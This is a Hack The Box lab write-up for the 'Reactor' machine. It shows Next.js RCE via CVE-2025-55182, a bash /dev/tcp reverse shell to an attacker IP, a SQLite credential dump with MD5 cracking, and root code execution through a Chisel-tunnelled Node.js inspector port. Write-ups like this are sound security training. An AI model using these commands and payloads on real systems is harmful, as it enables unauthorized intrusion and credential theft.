---
title: "Hack The Box | Reactor"
description: "Reactor is an easy Linux machine featuring Next.js 15.0.3 vulnerable to CVE-2025-55182 (React2Shell), leading to unauthenticated RCE. Lateral movement via SQLite credential dumping and MD5 cracking leads to a Node.js Inspector debug port for root privilege escalation."
pubDate: "Jun 08 2026"
heroImage: "/reactor.png"
badge: "Linux - Easy"
tags: ["CVE-2025-55182","React2Shell","NextJS","Linux","Reverse Shell","SQLite","Hashcat","Chisel","PrivEsc","HTB"]
---

- 1. Nmap TCP Open Ports:

```sh
sudo nmap -sS -p- --open -n -Pn --min-rate 5000 10.129.12.175 -oG allports
```

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 3000/tcp | HTTP |

- 1.2 Nmap basic scripts and service scan:

```sh
nmap -sCV -p22,3000 -oN target 10.129.12.175
```

```python
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Node.js (Next.js)
|_http-title: ReactorWatch | Core Monitoring System
| http-server-header: x-powered-by: Next.js
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- 2. Web Fingerprinting:

```sh
curl -sI http://10.129.12.175:3000 | grep -iE 'x-powered-by|next|x-nextjs'
# X-Powered-By: Next.js
# x-nextjs-cache: HIT
# x-nextjs-prerender: 1
```

Browsing to the dashboard: **ReactorWatch | Core Monitoring System** — a nuclear reactor monitoring panel with employee names (Elena Rodriguez, Marcus Kim, James Thompson). No login visible, SPA static. No hidden routes found via gobuster.

The application itself has no bugs, so we pivot to the framework — Next.js 15.0.3.

---

- 3. Exploitation — CVE-2025-55182 (React2Shell):

Next.js 15.0.3 is vulnerable to **CVE-2025-55182** — unauthenticated RCE via the `Next-Action` header. The React Flight Protocol fails to validate references between chunks, enabling prototype pollution that escalates to arbitrary code execution via `Function()`.

```sh
# PoC — test command execution
python3 CVE-2025-55182.py http://10.129.12.175:3000 id
# uid=999(node) gid=988(node)
```

- 3.2 Reverse Shell:

```sh
# Encode the payload
echo 'bash -i >& /dev/tcp/10.10.14.200/4444 0>&1' | base64 -w 0

# Listener
nc -lvnp 4444

# Execute via exploit
python3 CVE-2025-55182.py http://10.129.12.175:3000 "echo BASE64_HERE | base64 -d | bash"
```

Shell obtained as `node`.

---

- 4. Lateral Movement — SQLite + Hash Cracking:

```sh
ls -la /opt/reactor-app/
# reactor.db  ← SQLite database
# .env        ← API keys, configuration
```

- 4.2 Dump the database:

```sql
sqlite3 /opt/reactor-app/reactor.db

.tables
SELECT * FROM users;
```

```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Two MD5 hashes (32 hex characters).

- 4.3 Crack the hash:

```sh
echo "39d97110eafe2a9a68639812cd271e8e" > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
# 39d97110eafe2a9a68639812cd271e8e:reactor1
```

- 4.4 Switch to engineer:

```sh
su engineer
# Password: reactor1
cat /home/engineer/user.txt
# HTB{...}
```

---

- 5. Privilege Escalation — Node.js Inspector:

```sh
ss -tulnp | grep 9229
# tcp  LISTEN  127.0.0.1:9229  ← Node.js V8 Inspector
```

```sh
ps aux | grep inspect
# root  /usr/bin/node --inspect /opt/uptime-monitor/worker.js
```

The uptime monitor worker runs as **root** with `--inspect` enabled.

- 5.2 Tunnel with Chisel:

```sh
# Attacker
chisel server -p 8000 --reverse

# Victim
./chisel client 10.10.14.200:8000 R:9229:127.0.0.1:9229
```

Now `localhost:9229` on attacker → `127.0.0.1:9229` on victim.

- 5.3 Connect to debugger and execute as root:

```sh
node inspect 127.0.0.1:9229
```

```javascript
debug> exec("process.mainModule.require('child_process').execSync('id').toString()")
// uid=0(root) gid=0(root)

debug> exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
// HTB{...}
```

---

## Attack Chain Summary

| Phase | Technique | Tool |
|-------|-----------|------|
| Recon | Port scan + fingerprinting | nmap, curl |
| Exploit | React2Shell RCE (CVE-2025-55182) | Python PoC, netcat |
| Lateral | SQLite dump + MD5 crack | sqlite3, hashcat |
| PrivEsc | Node Inspector debug port + Chisel | chisel, node inspect |
